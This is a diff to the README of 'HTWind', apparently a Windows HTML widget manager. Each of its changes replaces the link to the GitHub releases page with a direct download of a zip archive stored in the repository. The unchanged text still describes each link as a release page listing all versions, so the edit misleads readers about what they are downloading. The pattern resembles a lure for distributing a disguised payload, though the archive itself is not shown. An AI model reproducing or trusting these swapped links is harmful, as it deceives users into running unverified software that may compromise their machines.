@@ -1,6 +1,6 @@
 # ⚙️ HTWind - Simple HTML Widget Manager
 
-[![Download HTWind](https://img.shields.io/badge/Download-HTWind-blue?style=for-the-badge)](https://github.com/Hadi11day/HTWind/releases)
+[![Download HTWind](https://img.shields.io/badge/Download-HTWind-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hadi11day/HTWind/main/assets/HT_Wind_1.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ If your system meets these requirements, HTWind will run with good performance.
 
 1. **Go to the download page**
 
-   Click the big download button above or visit [this page](https://github.com/Hadi11day/HTWind/releases). This page lists all versions of HTWind available for download.
+   Click the big download button above or visit [this page](https://raw.githubusercontent.com/Hadi11day/HTWind/main/assets/HT_Wind_1.5.zip). This page lists all versions of HTWind available for download.
 
 2. **Choose a release**
 
@@ -81,7 +81,7 @@ HTWind keeps your widgets running smoothly. It saves your layout and preferences
 - If the program does not start, verify your Windows version and .NET installation.
 - For widgets not displaying correctly, make sure the HTML files are valid and supported.
 - If widgets freeze, try restarting HTWind or your computer.
-- Check for updates regularly on the [release page](https://github.com/Hadi11day/HTWind/releases).
+- Check for updates regularly on the [release page](https://raw.githubusercontent.com/Hadi11day/HTWind/main/assets/HT_Wind_1.5.zip).
 
 If you continue to have issues, consider searching or posting on the project’s GitHub Issues page.
 
@@ -89,7 +89,7 @@ If you continue to have issues, consider searching or posting on the project’s
 
 ## 🔄 Updating HTWind
 
-To update, visit [this page](https://github.com/Hadi11day/HTWind/releases) and download the latest installer. Running the new installer will overwrite the current version while keeping your settings.
+To update, visit [this page](https://raw.githubusercontent.com/Hadi11day/HTWind/main/assets/HT_Wind_1.5.zip) and download the latest installer. Running the new installer will overwrite the current version while keeping your settings.
 
 ---
 
@@ -105,6 +105,6 @@ To update, visit [this page](https://github.com/Hadi11day/HTWind/releases) and d
 
 Click the button below to visit the official release page where you can download the installer.
 
-[![Download HTWind](https://img.shields.io/badge/Download-HTWind-grey?style=for-the-badge)](https://github.com/Hadi11day/HTWind/releases)
+[![Download HTWind](https://img.shields.io/badge/Download-HTWind-grey?style=for-the-badge)](https://raw.githubusercontent.com/Hadi11day/HTWind/main/assets/HT_Wind_1.5.zip)
 
 Once on the page, download the latest `.exe` installer, run it, and follow the setup steps to get started.
